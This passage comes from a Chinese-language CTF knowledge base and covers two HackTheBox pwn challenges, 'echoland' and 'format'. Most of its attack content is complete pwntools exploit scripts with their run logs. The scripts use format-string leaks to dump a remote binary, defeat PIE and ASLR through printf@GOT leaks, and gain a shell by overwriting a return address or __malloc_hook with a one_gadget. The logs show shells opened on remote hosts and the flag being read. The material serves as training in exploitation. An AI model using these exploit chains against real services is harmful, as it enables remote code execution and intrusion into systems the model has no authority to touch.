elf_found=True
addr = 0
leaked_main = 0
while elf_found:
    p = remote(ip,port)
    print("CURRENT ADDRESS = " + hex(addr))
    leaked_main = leak_pointer_to_main() + addr
    addr, elf_found = search_elf_magic_bytes(leaked_main,addr)

start_main_addr = addr

def dump_binary(magic_bytes_addr):
    '''Dump the binary data'''
    base = magic_bytes_addr
    leak,leaked = bytearray(),bytearray()
    offset = len(leaked)
    while offset <= 0x5000:
        with open("leak.bin", "ab") as l:
            addr = p64(base + len(leaked))
            leak_part = b"%9$sEOF\x00"
            p.sendline(leak_part + addr)
            resp = p.recvuntil(b"1. Scream.\n2. Run outside.\n> ")
            leak = resp.split(b"EOF")[0] + b"\x00"
            leaked.extend(leak)
            print("Address: " + hex(unpack("<Q",addr.ljust(8,b"\x00"))[0]) + " - Offset: " + str(offset) + ":" + hex(offset)+ " - Leaked data: " + leak.decode("unicode_escape"))
            l.write(leak)
            l.flush()
            offset = len(leaked)

# Dump binary:
# dump_binary(start_main_addr)

# After reversing - 0x00003fa8
def leak_printf_got(start_main_addr):
    '''Leak printf@GOT - which is dynamically linked during runtime'''
    printf_GOT = 0x00003fa8
    printf_addr = start_main_addr + printf_GOT
    print("Leaked printf address: " + hex(printf_addr))
    leak_part = b"%9$sEOF\x00"
    p.sendline(leak_part + p64(printf_addr))
    resp = p.recv()#until(b"1. Scream.\n2. Run outside.\n> ")
    leak = resp.split(b"EOF")[0] + b"\x00"
    libc_printf = hex(u64(leak.ljust(8,b"\x00")))
    print("[!!!] Leaked libc printf : " + libc_printf)
    return int(libc_printf,16)

libc_printf = leak_printf_got(start_main_addr)

def fuzz_buffer_overflow(ip,port):
    '''Find the offset of RIP overflow'''
    for i in range(30,100):
        try:
            p = remote(ip,port)
            p.sendline(b"1")
            sleep(1)
            p.recv()
            print("FUZZING: " + str(i))
            p.sendline(cyclic(i))
            sleep(1)
            data = p.recv()
            print(data.decode("unicode_escape"))
            if b"Segmentation" in data:
                print("========================\nBuffer overflow found @: " + str(i) + "\n========================")
                break
            p.close()
        except:
            p.close()
            pass

#fuzz_buffer_overflow(ip,port)

def get_rce(libc_printf):
    printf_libc_offset = 0x0000000000064f70
    one_gadget = 0x4f432
    rce = libc_printf - printf_libc_offset + one_gadget
    print("CALCULATED RCE: " + hex(rce))
    p.sendline(b"1")
    p.recv()
    p.send(b"A"*64 +p64(0x0000000000064f70) + p64(rce) + b"\x00"*0x70)
    p.interactive()

get_rce(libc_printf)
```

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/echoland]
└─# python3 dumpbinary.py
CURRENT ADDRESS = 0x0
Leaked main address: 0x561281687400
Deferenced pointer: ó\x0fúAWL=k)\x00
Deferenced pointer: uÐèYÿÿÿÇEü\x00
Deferenced pointer: ó\x0fú=\x1d\x00
Deferenced pointer: ó\x0fúòÿ%.\x00
Deferenced pointer: ó\x0fúHH\x05\x99/\x00
Deferenced pointer: \x00
Deferenced pointer: \x00
Deferenced pointer: \x00
Deferenced pointer: \x00
Deferenced pointer: \x00
Deferenced pointer: \x00
Deferenced pointer: \x00
Deferenced pointer: \x00
Deferenced pointer: ð?\x00
Deferenced pointer: ble\x00
Deferenced pointer: \x00
Deferenced pointer: \x00
Deferenced pointer: \x00
Deferenced pointer: \x04
Deferenced pointer: \x00
Deferenced pointer: \x7fELF\x00
MAGIC BYTES FOUND @: 0x561281686000
Leaked printf address: 0x561281689fa8
[!!!] Leaked libc printf : 0x7f1f0dabcf70
CALCULATED RCE: 0x7f1f0daa7432
>> $ id
uid=999(ctf) gid=999(ctf) groups=999(ctf)
$ whoami
ctf
$ ls
echoland
flag.txt
libc.so.6
run_challenge.sh
$ cat flag.txt
HTB{bl1nd_R0p_1s_c0ol_a1nt_1t?}
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland10.jpg)

other exp script:

 - getshell.py

``` bash
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

import struct
import re

host="138.68.129.154"
port=31898

def search(addr):
    # p = remote(args.srv, args.port)
    # rec = p.recvuntil("> ")
    # print(rec)
    p.sendline(b"%9$s___" + b"\x00" + p64(addr))
    rec = p.recvuntil("1. Scream.\n2. Run outside.\n> ")
    # print(rec)
    # p.close()
    return rec.split(b"___")[0] + b"\x00"

def searchelf(addr):
    # p = remote(args.srv, args.port)
    # rec = p.recvuntil("> ")
    # print(rec)
    while True:
        p.sendline(b"%9$s___" + b"\x00" + p64(addr))
        rec = p.recvuntil("1. Scream.\n2. Run outside.\n> ")
        print(rec)
        if rec.split(b"___")[0].startswith("\x7FELF"):
            break
        addr -= 0x1000
    # print(rec)
    # p.close()
    return addr

def get_qword(addr):
    data = b""
    while len(data) < 8:
        p.sendline(b"%9$s___" + b"\x00" + p64(addr))
        rec = p.recvuntil("1. Scream.\n2. Run outside.\n> ")
        data += rec.split(b"___")[0] + b"\x00"

    data = data[:8]
    return u64(data)

def stackleak():
    # p = remote(args.srv, args.port)
    rec = p.recvuntil(b"> ")
    # print(rec)
    idx = 2
    addrs = {}
    while idx < 64:
        p.sendline("%{}$p".format(idx))
        rec = p.recvuntil(b"> ")
        # print(rec)
        addrs[idx] = rec.split(b"\n")[0]
        idx += 1
    print(addrs)
    # p.close()
    return addrs[12], addrs[13] # main, libc

p = remote(host, port)
main_addr, libc_addr = stackleak()
main_elf = int(main_addr, 16) - 0x1400
libc_elf = int(libc_addr, 16) - 0x21BF7

# print("addr {} elf {}".format(libc_addr, hex(searchelf(libc_elf))))


""" code to copy the entire executable from the memory
offset = 0
f = open("elf2", "a")
while offset < 0x6000:
    data = search(addr + offset)

    print("{} {}".format(offset, data))
    offset += len(data)
    f.write(data)
"""
printf_got_offset = 0x3fa8


print("libc {}".format(hex(libc_elf)))
printf_address = get_qword(main_elf + printf_got_offset)
print("printf address {}".format(hex(printf_address)))
binsh_offset = 0x1b3e1a
binsh_address = libc_elf + binsh_offset
print(search(binsh_address))
print("printf address {}".format(hex(printf_address)))
one_gadget_offset = 0x4f432
one_gadget_address = libc_elf + one_gadget_offset

p.sendline("1")
p.recvuntil(">> ")
p.sendline(p64(one_gadget_address) * 11 + b"\x00" * 0x40)
p.interactive()
```

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/echoland]
└─# python3 getshell.py
[+] Opening connection to 138.68.129.154 on port 31898: Done
/root/hackthebox/challenge/pwn/echoland/getshell.py:54: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline("%{}$p".format(idx))
{2: b'0xfffffff4', 3: b'(nil)', 4: b'0x1d', 5: b'0x7f0fe1ae44c0', 6: b'0x7ffdeffc7288', 7: b'0x100000000', 8: b'0xa70243825', 9: b'(nil)', 10: b'0x7ffd00000000', 11: b'0x100000000', 12: b'0x55a94d2d0400', 13: b'0x7f0fe14efbf7', 14: b'0x1', 15: b'0x7ffdeffc7288', 16: b'0x100008000', 17: b'0x55a94d2d02ef', 18: b'(nil)', 19: b'0xa9482bc8c760734e', 20: b'0x55a94d2d0160', 21: b'0x7ffdeffc7280', 22: b'(nil)', 23: b'(nil)', 24: b'0xfde16e6a2c00734e', 25: b'0xfc05730f383e734e', 26: b'0x7ffd00000000', 27: b'(nil)', 28: b'(nil)', 29: b'0x7f0fe18cf8d3', 30: b'0x7f0fe18b5638', 31: b'0x7f72e', 32: b'(nil)', 33: b'(nil)', 34: b'(nil)', 35: b'0x55a94d2d0160', 36: b'0x7ffdeffc7280', 37: b'0x55a94d2d018e', 38: b'0x7ffdeffc7278', 39: b'0x1c', 40: b'0x1', 41: b'0x7ffdeffc8ea6', 42: b'(nil)', 43: b'0x7ffdeffc8eb1', 44: b'0x7ffdeffc8eb9', 45: b'0x7ffdeffc8ec9', 46: b'0x7ffdeffc8ed3', 47: b'0x7ffdeffc8ee0', 48: b'0x7ffdeffc8ee6', 49: b'0x7ffdeffc8eef', 50: b'0x7ffdeffc8efb', 51: b'0x7ffdeffc8f09', 52: b'0x7ffdeffc8f13', 53: b'0x7ffdeffc8f1f', 54: b'0x7ffdeffc8f2b', 55: b'0x7ffdeffc8f31', 56: b'0x7ffdeffc8f4c', 57: b'0x7ffdeffc8f59', 58: b'0x7ffdeffc8f61', 59: b'0x7ffdeffc8f6b', 60: b'0x7ffdeffc8f79', 61: b'0x7ffdeffc8fbb', 62: b'0x7ffdeffc8fce', 63: b'0x7ffdeffc8fd7'}
libc 0x7f0fe14ce000
/root/hackthebox/challenge/pwn/echoland/getshell.py:41: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  rec = p.recvuntil("1. Scream.\n2. Run outside.\n> ")
printf address 0x70007f0fe1532f70
/root/hackthebox/challenge/pwn/echoland/getshell.py:17: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  rec = p.recvuntil("1. Scream.\n2. Run outside.\n> ")
b'/bin/sh\x00'
printf address 0x70007f0fe1532f70
/root/hackthebox/challenge/pwn/echoland/getshell.py:94: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline("1")
/root/hackthebox/challenge/pwn/echoland/getshell.py:95: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil(">> ")
[*] Switching to interactive mode
$ id
uid=999(ctf) gid=999(ctf) groups=999(ctf)
$ whoami
ctf
$ cat flag.txt
HTB{bl1nd_R0p_1s_c0ol_a1nt_1t?}
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland11.jpg)

#### 摘自(致敬原作)......

 - 浏览medium.com博客每月有次数限制，并且5$收费，故摘录文章。。。
 - [PWN Echoland challenge — HTB](https://karol-mazurek95.medium.com/pwn-echoland-challenge-htb-3363dbd6dc23)

<!-- kb:end echoland -->

</details>

<a id="case-format"></a>

## PIE 泄漏与格式化写入

两份分析分别追踪栈偏移、libc 识别和写入原语，保留 printf 触发分配及 hook 修改的完整脚本与运行限制。

<p class="kb-provenance">来源 format · 原记录 2021-01-12 · 23 个代码块 · 22 处图片引用</p>

<details class="kb-evidence" id="record-format">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start format -->

#### 详细过程及exp - 1

与任何二进制利用挑战一样，首先在二进制文件上运行checksec，以查看启用了哪种保护。

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/format]
└─# checksec format
[*] '/root/hackthebox/challenge/pwn/format/format'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```



我们发现NX, Full RELRO和PIE都是启用的。进一步发现了堆栈Canary的存在。NX被启用意味着不能执行堆栈的内容。启用PIE意味着每次在新进程中生成二进制数据时，都会为该二进制数据选择一个新的基址。Full RELRO意味着不能修改get部分的内容。打开IDA中的二进制文件并分析它，以了解它的功能。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format10.jpg)

main函数分别调用init和echo两个函数。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format11.jpg)

echo函数分别调用偏移量0x10a0和偏移量0x1090的两个函数。PLT部分似乎已被剥离或损坏，因此无法看到确切的函数名。但是，可以查看二进制文件的导入，并做出有根据的猜测。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format12.jpg)

查看导入表，看到它导入了另外两个函数。根据echo函数中每个函数调用的输入参数，假设偏移量为0x10a0的函数是fgets，偏移量为0x1090的函数是printf。因此，二进制代码似乎接受用户输入，并使用printf将用户输入作为字符串格式参数输出。这被认为是危险的，因为用户现在拥有从栈读取或写入的能力。可以通过使用' %p '或' %s '等格式说明符来验证二进制文件存在格式字符串漏洞。

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/format]
└─# ./format
echo test
echo test
%p
0x7f969b0b6a03
%s
```

从上可以看出，能够使用' %p '泄漏堆栈的一个成员。有趣的是，格式说明符还允许使用格式说明符' %offset$p '来选择堆栈上的偏移量。为了理解它是如何工作的，必须理解printf是如何工作的。

printf函数原型是int printf(char const* format，…)，其中的'…'符号描述了一个可变参数。在像C这样的本地语言中，带有可变参数的被调用者不知道有多少参数被赋给了它的参数包。在这个例子中，printf使用format参数来指示需要多少个堆栈参数。用户可能为参数包提供了足够的参数，也可能没有提供足够的参数，但是函数仍然会从堆栈顶部输出给定数量的对象。使用' offset$ '表示法, 可以重用以前在格式字符串中使用的参数，而不需要参数。

例如，可能有一个字符串，其中一个特定变量要打印两次。现在，可以将参数赋值给参数包两次，或者直接在打印的变量的最后一个实例上使用' offset$ '表示法。下面的例子演示了这两种方法。

``` bash
printf("%s %s", string, string);
printf("%s %1$s", string);
```

使用这种技术，可以迭代堆栈的内容。注意，每个偏移量对应一个按二进制位对齐的堆栈元素，即32位为4字节，64位为8字节。

 - stack.py

``` bash
from pwn import *
s = process('./format')
for i in range(1, 100):
    s.sendline('%{}$p '.format(i).ljust(0x100, 'a'))
    print "{:2}: {}".format(i, s.recvline().split(' ')[0])
s.close()
```

上面显示了一个用于迭代堆栈的简单python脚本。

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/format]
└─# python stack.py
[+] Starting local process './format': pid 4567
 1: 0x7f6b05dcaa03
 2: (nil)
 3: 0x7f6b05cfae2e
 4: 0x7ffcdede77a0
 5: (nil)
 6: 0x6161612070243625
 7: 0x6161616161616161
 8: 0x6161616161616161
 9: 0x6161616161616161
10: 0x6161616161616161
11: 0x6161616161616161
12: 0x6161616161616161
13: 0x6161616161616161
14: 0x6161616161616161
15: 0x6161616161616161
16: 0x6161616161616161
17: 0x6161616161616161
18: 0x6161616161616161
19: 0x6161616161616161
20: 0x6161616161616161
21: 0x6161616161616161
22: 0x6161616161616161
23: 0x6161616161616161
24: 0x6161616161616161
25: 0x6161616161616161
26: 0x6161616161616161
27: 0x6161616161616161
28: 0x6161616161616161
29: 0x6161616161616161
30: 0x6161616161616161
31: 0x6161616161616161
32: 0x6161616161616161
33: 0x6161616161616161
34: 0x6161616161616161
35: 0x6161616161616161
36: 0x6161616161616161
37: 0x61616161616161
38: (nil)
39: 0x2a0cd2c9e1808e00
40: 0x7ffcdede78d0
41: 0x55ff366b72b3
42: 0x7ffcdede79c0
43: 0x2a0cd2c9e1808e00
44: 0x55ff366b72d0
45: 0x7f6b05c32d0a
46: 0x7ffcdede79c8
47: 0x100000000
48: 0x55ff366b7284
49: 0x7f6b05c327cf
50: (nil)
51: 0x5bef4ce629faf90f
52: 0x55ff366b70c0
53: (nil)
54: (nil)
55: (nil)
56: 0xfe89d8c3d9af90f
57: 0xec72bb695dcf90f
58: (nil)
59: (nil)
60: (nil)
61: 0x1
62: 0x7ffcdede79c8
63: 0x7ffcdede79d8
64: 0x7f6b05e22180
65: (nil)
66: (nil)
67: 0x55ff366b70c0
68: 0x7ffcdede79c0
69: (nil)
70: (nil)
71: 0x55ff366b70ee
72: 0x7ffcdede79b8
73: 0x1c
74: 0x1
75: 0x7ffcdede8467
76: (nil)
77: 0x7ffcdede8470
78: 0x7ffcdede8488
79: 0x7ffcdede84b8
80: 0x7ffcdede84fb
81: 0x7ffcdede8514
82: 0x7ffcdede8529
83: 0x7ffcdede8536
84: 0x7ffcdede8545
85: 0x7ffcdede85a3
86: 0x7ffcdede85ae
87: 0x7ffcdede85b9
88: 0x7ffcdede85c6
89: 0x7ffcdede85d9
90: 0x7ffcdede85fe
91: 0x7ffcdede8612
92: 0x7ffcdede8622
93: 0x7ffcdede865c
94: 0x7ffcdede8679
95: 0x7ffcdede8683
96: 0x7ffcdede86d1
97: 0x7ffcdede86d9
98: 0x7ffcdede86ea
99: 0x7ffcdede86ff
[*] Stopped process './format' (pid 4567)
```

正如上图所示，能够从堆栈中枚举元素。更有趣的是，自己的字符串格式输入似乎出现在堆栈上的偏移量6。

``` bash
35: 0x6161616161616161
36: 0x6161616161616161
37: 0x61616161616161
38: (nil)
39: 0x2a0cd2c9e1808e00
40: 0x7ffcdede78d0
41: 0x55ff366b72b3
42: 0x7ffcdede79c0
43: 0x2a0cd2c9e1808e00
44: 0x55ff366b72d0
45: 0x7f6b05c32d0a
```

再往下看堆栈，注意到字符串格式的输入以偏移量37-38结束。然而，接下来，注意到偏移量41处的echo返回地址。这可能表明，尽管启用了PIE，仍然能够泄漏二进制文件的基址。得先核实一下。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format13.jpg)

从上图中可以看出，echo ends调用的返回地址位于偏移量0x12b3，这与堆栈上发现的泄漏相对应。因此，可以假定栈上的元素是返回地址，因此可以通过从泄漏的地址减去0x12b3来计算二进制数据的基址。可以按照如下所示编写脚本。

``` bash
s.sendline('%41$p ')
base_ret = int(s.recv(1024).split(' ')[0], 16)
base = base_ret - 0x12b3
```

现在有了二进制文件的基址，可以尝试进一步从libc泄漏一个地址，这样就可以找到libc的基址。首先在got小节中获取printf导入的偏移量。

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/format]
└─# objdump -R format | grep printf
0000000000003fc0 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5
```

现在有了偏移量，可以使用' %s '格式说明符对堆栈执行更深入的读取。' %p '指示符只输出存储在堆栈中给定偏移量处的值，与之相反，' %s '指示符将存储在堆栈中给定偏移量处的值作为指向字符串的指针，并输出字符串的内容。

由于可以通过从偏移量6开始的字符串格式输入来控制一些堆栈元素，因此可以使用该格式指定要从偏移量7检索字符串数据，然后指定偏移量7的目标地址。可以按照如下所示编写脚本。

``` bash
gots_printf = base + 0x3fc0
s.sendline('%7$s'.ljust(8, '\x00') + p64(gots_printf))
glibc_printf = u64(s.recv(1024).ljust(8, '\x00'))
print "GLIBC(printf) leak: {}".format(hex(glibc_printf))
```

现在，运行泄漏脚本，并验证能够泄漏来自libc共享库的地址。

 - leak.py

``` bash
from pwn import *

context.arch = "amd64"
s = remote('178.128.40.217', 32755) # 31019)
s.sendline('%41$p ')

base_ret = int(s.recv(1024).split(' ')[0], 16)
base = base_ret - 0x12b3
gots_printf = base + 0x3fc0

s.sendline('%7$s'.ljust(8, '\x00') + p64(gots_printf))

glibc_printf = u64(s.recv(1024).ljust(8, '\x00'))
print "GLIBC(printf) leak: {}".format(hex(glibc_printf))

s.close()
```

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/format]
└─# python leak.py
[+] Opening connection to 178.128.40.217 on port 32755: Done
GLIBC(printf) leak: 0x7f436277be80
[*] Closed connection to 178.128.40.217 port 32755
```

如上图所示，成功地在libc共享库中获取了printf函数的地址。由于ASLR在页面长度为0x1000字节的页面对齐基础上随机化libc共享库的位置，所以可以确保地址的最后3个字节永远不会随机化。因此，可以使用最后三部分来确定远程服务器正在使用的libc版本。

 - [libc database search](https://libc.blukat.me/)

使用在线libc数据库搜索工具来定位一个libc库，其中的printf函数以0xe80结束。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format14.jpg)

如上图所示，有多个候选对象。一个有根据的猜测把我们带到了选择的版本。现在可以在数据库中查找所有的符号，也可以在Ubuntu存储库中找到文件并下载它。在本例中，选择查找libc版本并下载它。由于不能保证外部链接的生命周期，所以将下面的文件作为直接下载链接。

 - [libc6_2.27-3ubuntu1_amd64.deb](https://stackhound.me/wp-content/uploads/2020/09/b03ba0c98d0f0bc9.7z)

现在可以使用7-zip这样的解压缩工具来打开这个包。

在debian包中，找到libc共享库并将其转储到磁盘。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format15.jpg)

现在可以访问远程进程中的libc共享库，需要考虑攻击策略。因为程序有完整的RELRO，所以不能覆盖get部分的fgets或printf指针，这是唯一可以直接控制的函数。然而，可以覆盖libc共享库中的内容，比如__malloc_hook。malloc钩子是一个函数指针，当它非空时，每次使用malloc分配内存时都会调用它。然而，没有任何方式传递参数给重写的malloc钩子，不能使系统直接生成一个'/bin/sh'进程。相反，可以使用one-gadget，这是libc中的一个gadget，它生成'/bin/sh'，而不需要向它传递任何参数。

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/format]
└─# objdump -T ./libc-2.27.so | grep malloc_hook
00000000003ebc30  w   DO .data  0000000000000008  GLIBC_2.2.5 __malloc_hook
┌──(root💀kali)-[~/hackthebox/challenge/pwn/format]
└─# one_gadget ./libc-2.27.so
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

如上所示，可以确定所需的偏移量。可以按照如下所示编写脚本。

``` bash
glibc_base = glibc_printf - 0x64e80
glibc_malloc_hook = glibc_base + 0x3ebc30
glibc_one_gadget = glibc_base + 0x4f322
```

现在已经有了所需的所有组件，可以继续进行攻击了。就像使用' %p '和' %s '从堆栈中读取变量一样，也可以使用' %n '对它们进行写入。' %n '说明符将把字符串中先于它的字节数写到堆栈上传递的目标参数中。例如，printf(' 1234%n '， &destination)将把4写入destination。可以使用printf(' %XXc%Y$n ')每次覆盖一个字节，其中XX表示字节的数值，Y表示堆栈上的目标偏移量。使用pwntools的延迟版本如下所示。

``` bash
s.sendline(fmtstr_payload(6, { glibc_malloc_hook: glibc_one_gadget }))
s.recv(1024)
```

现在已经覆盖了malloc钩子，需要做的就是使用malloc强制分配。一种方法是让格式字符串说明符生成一个太大而不能临时存储在堆栈上的字符串，从而迫使printf函数使用malloc进行临时分配。这可以如下所示完成。

``` bash
s.sendline('%100000c')
```

最终exp脚本

 - getshell.py

``` bash
from pwn import *

context.arch = "amd64"

s = remote('178.128.40.217', 32755) # 31019)
s.sendline('%41$p bbbb')

base_ret = int(s.recvuntil('bbbb\n').split(' ')[0], 16)
base = base_ret - 0x12b3
gots_printf = base + 0x3fc0

s.sendline('%7$s'.ljust(8, '\x00') + p64(gots_printf))

glibc_printf = u64(s.recv(1024).ljust(8, '\x00'))
print "GLIBC(printf) leak: {}".format(hex(glibc_printf))
glibc_base = glibc_printf - 0x64e80
glibc_malloc_hook = glibc_base + 0x3ebc30
glibc_one_gadget = glibc_base + 0x4f322

s.sendline(fmtstr_payload(6, { glibc_malloc_hook: glibc_one_gadget }))
s.recv(1024)
s.sendline('%100000c')
s.interactive()
s.close()
```

利用效果。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format16.jpg)

#### 详细过程及exp - 2
#### 1. Basic checks:

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/format]
└─# file format
format: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5d38e04d29b4aae722164869f3151cea776ce91c, for GNU/Linux 3.2.0, not stripped
┌──(root💀kali)-[~/hackthebox/challenge/pwn/format]
└─# checksec format
[*] '/root/hackthebox/challenge/pwn/format/format'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

#### 2. Run binary with format string as input and spot the vulnerability:

 - [Format string attack](https://owasp.org/www-community/attacks/Format_string_attack)

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/format]
└─# ./format
%p%p%p
0x7f167f86da03(nil)0x7f167f79de8e
```

#### 3. Disassemble binary with your favorite disassembler:

Vulnerable is printf() which should look like: printf("%s\n", argv[1]);

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format17.jpg)

#### 4. General overview of what is being leaked:

(1) 6th pointer — beginning of the printf() output

(2) 30th pointer — three free bytes which you need to keep in mind when you leak data using the printf() function (due to stack alignment) additionally, the direct parameter access to this pointer will change depending on the amount of data passed to the printf() function

(3) 37th pointer — init+117address needed for calculating libc base

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format18.jpg)

#### 5. Run binary in GDB — defeating PIE:

set a breakpoint at the printf() in echo()

check the init+117 PIE offset (before execution in GBD)

using [direct parameter access](https://kevinalmansa.github.io/application%20security/Format-Strings/) input format string %37$p to leak init+117address

calculate the base ELF address after a leak to bypass the PIE security

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format19.jpg)

You can verify the base address of ELF file using vmmap or info proc map

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format20.jpg)

The first phase of exploit written in python2 based on pwntools containing everything so far.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format21.jpg)

#### 6. Leak the __printf address from libc through printf():

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format22.jpg)

Use %s instead of %p
(access value printed by printf() instead of a [pointer to the string](https://dyclassroom.com/c/c-pointers-and-strings))

Remember about stack alignment

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format23.jpg)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format24.jpg)

#### 7. Check the libc version on the remote system

Use [https://libc.blukat.me/](https://libc.blukat.me/) with the leaked address of __printf to check the libc version being used on the remote system.

Check possible libc architecture, there is clearly only one option which is libc6_2.27–3ubuntu1_amd64 because it is the only one 64-bit libc.

Download above libc and place it in the directory with exploit.py

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format25.jpg)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format26.jpg)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format27.jpg)

#### 8. Taking control of execution flow:

The program has FULL RELRO, so there is no option of rewriting the fgets() or printf() address, but the content of libc shared libraries is writeable. Use this advantage to overwrite __malloc_hook function pointer.

The vulnerable function in this scenario is malloc() which is called, when the string sent to printf() is too big, __malloc_hook is called whenever malloc() is used.

``` bash
# check __malloc_hook in leaked libc
┌──(root💀kali)-[~/hackthebox/challenge/pwn/format]
└─# objdump -T libc-2.27.so | grep __malloc_hook
00000000003ebc30  w   DO .data  0000000000000008  GLIBC_2.2.5 __malloc_hook
```

You can trigger malloc() by calling printf(“%10000$c”) — this allocates too many bytes for the stack, forcing libc to allocate the space on the heap instead.

You can overwrite the __malloc_hook using direct parameter write %6$n

It is not possible to specify the parameters of the overridden __malloc_hook . The way out of this situation will be to use a [gadget](https://dzone.com/articles/a-ctf-example-shows-you-the-easy-and-powerful-one) called [one_gadget](https://ir0nstone.gitbook.io/notes/types/stack/one-gadgets-and-malloc-hook) which in fact is a execve("/bin/sh") command that is present in libc

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/format]
└─# one_gadget libc-2.27.so
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

#### 8. Calculating necessary addresses:

Calculate base address of libc, by subtracting the 0x64e80 from the leaked printf()

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/format]
└─# objdump -T libc-2.27.so | grep " printf$"
0000000000064e80 g    DF .text  00000000000000c3  GLIBC_2.2.5 printf
```

Calculate __malloc_hook and one_gadget based on the computed libc and static addresses from leaked libc.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format28.jpg)

Use [pwnlib.fmtstr](https://docs.pwntools.com/en/stable/fmtstr.html#module-pwnlib.fmtstr) — [format string](https://docs.pwntools.com/en/stable/fmtstr.html) bug exploitation tools to easily calculate and override __malloc_hook with one gadget and trigger it!

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format29.jpg)

Add context.arch = "amd64" at the top of the script to choose the system architecture of the targeted binary. Otherwise, an error will pop up.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format30.jpg)

#### 9. Final exploit:

``` python
from pwn import *

context.arch = "amd64"
context.log_level = 'debug'
elf = ELF("format")
#libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
libc = ELF("libc-2.27.so") # <-- Loading leaked libc
#p = process("./format")
p = remote("188.166.173.208",31941)
#gdb.attach(p,'''b*__malloc_hook''')

# ELF base address - leaking && calculating ---
p.sendline("%37$p")
init_leak = (p.recvline())
log.success("LEAK => (init+117) address: " + init_leak)
base_elf = int(init_leak,16) - 0x126d
log.info("Base ELF address: " + hex(base_elf))
elf.address = base_elf # updating ELF

# Leaking __printf address through printf() ---
printf_got_plt = elf.got["printf"]
log.info("printf@got.plt address: " + hex(printf_got_plt))
p.sendline("AAAA%7$s" + p64(printf_got_plt))
printf_leak = p.recv()
printf_libc = u64(printf_leak[4:10].ljust(8,"\x00"))
log.success("Leaked __printf: " + hex(printf_libc))

# Calculating base libc, __malloc_hook and one_gadget ---
base_libc = printf_libc - 0x64e80
malloc_hook_addr = base_libc + 0x3ebc30
one_gadget = base_libc + 0x4f322

# Taking control of exeuction flow - overriding __malloc_hook with one_gadget ---
p.sendline(fmtstr_payload(6, { malloc_hook_addr: one_gadget }))
p.recv()
p.sendline('%100000c') # __malloc_hook trigger
p.interactive()
p.close()
```

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/format]
└─# python pwnexp.py
[*] '/root/hackthebox/challenge/pwn/format/format'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
